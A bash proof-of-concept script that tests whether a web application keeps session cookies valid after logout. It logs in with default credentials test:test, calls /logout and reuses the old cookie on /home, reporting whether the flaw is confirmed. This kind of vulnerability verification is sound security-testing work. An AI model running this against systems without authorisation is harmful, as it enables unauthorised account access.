#!/bin/bash

# POC: Session Reuse After Logout Vulnerability
# This script demonstrates that session tokens remain valid after logout
# because the server fails to invalidate sessions server-side

TARGET_URL="${1:-http://localhost}"
LOGIN_ENDPOINT="${TARGET_URL}/login"
LOGOUT_ENDPOINT="${TARGET_URL}/logout"
PROTECTED_RESOURCE="${TARGET_URL}/home"

echo "[*] Session Reuse After Logout POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Login with default credentials
echo "[+] Step 1: Logging in with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -i -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

# Extract session cookie from login response
SESSION_COOKIE=$(echo "${LOGIN_RESPONSE}" | grep -i "set-cookie:" | grep "session=" | sed 's/.*session=\([^;]*\).*/\1/')

if [ -z "${SESSION_COOKIE}" ]; then
  echo "[-] Failed to extract session cookie from login response"
  echo "${LOGIN_RESPONSE}"
  exit 1
fi

echo "[+] Successfully obtained session cookie: ${SESSION_COOKIE:0:20}..."
echo ""

# Step 2: Verify session access to protected resource
echo "[+] Step 2: Verifying access to protected resource /home with valid session..."
PROTECTED_RESPONSE=$(curl -s -i -b "session=${SESSION_COOKIE}" "${PROTECTED_RESOURCE}")
PROTECTED_STATUS=$(echo "${PROTECTED_RESPONSE}" | head -n 1 | grep -o "[0-9]\{3\}")

if [ "${PROTECTED_STATUS}" = "200" ]; then
  echo "[+] Successfully accessed protected resource (HTTP ${PROTECTED_STATUS})"
  echo "[+] Response body preview:"
  echo "${PROTECTED_RESPONSE}" | tail -n +2 | grep -v "^$" | head -n 3
else
  echo "[-] Failed to access protected resource with session (HTTP ${PROTECTED_STATUS})"
  exit 1
fi
echo ""

# Step 3: Call logout endpoint with the session
echo "[+] Step 3: Calling logout endpoint with valid session..."
LOGOUT_RESPONSE=$(curl -s -i -b "session=${SESSION_COOKIE}" "${LOGOUT_ENDPOINT}")
LOGOUT_STATUS=$(echo "${LOGOUT_RESPONSE}" | head -n 1 | grep -o "[0-9]\{3\}")

echo "[+] Logout endpoint returned HTTP ${LOGOUT_STATUS}"
echo "[+] Logout response headers:"
echo "${LOGOUT_RESPONSE}" | head -n 10

echo ""
echo "[*] Waiting 1 second before testing reuse..."
sleep 1
echo ""

# Step 4: Attempt to use the same session token after logout
echo "[+] Step 4: Attempting to reuse the same session token after logout..."
REUSE_RESPONSE=$(curl -s -i -b "session=${SESSION_COOKIE}" "${PROTECTED_RESOURCE}")
REUSE_STATUS=$(echo "${REUSE_RESPONSE}" | head -n 1 | grep -o "[0-9]\{3\}")

echo "[+] Response status after logout with old session: HTTP ${REUSE_STATUS}"

if [ "${REUSE_STATUS}" = "200" ]; then
  echo "[!!!] VULNERABILITY CONFIRMED: Session still valid after logout!"
  echo "[!!!] Server failed to invalidate session server-side"
  echo ""
  echo "[+] Response body preview (should have been blocked):"
  echo "${REUSE_RESPONSE}" | tail -n +2 | grep -v "^$" | head -n 3
  echo ""
  exit 0
elif [ "${REUSE_STATUS}" = "302" ] || [ "${REUSE_STATUS}" = "401" ]; then
  echo "[-] Session properly invalidated - returned HTTP ${REUSE_STATUS}"
  echo "[-] Vulnerability not present or already patched"
  exit 1
else
  echo "[?] Unexpected response code: HTTP ${REUSE_STATUS}"
  exit 1
fi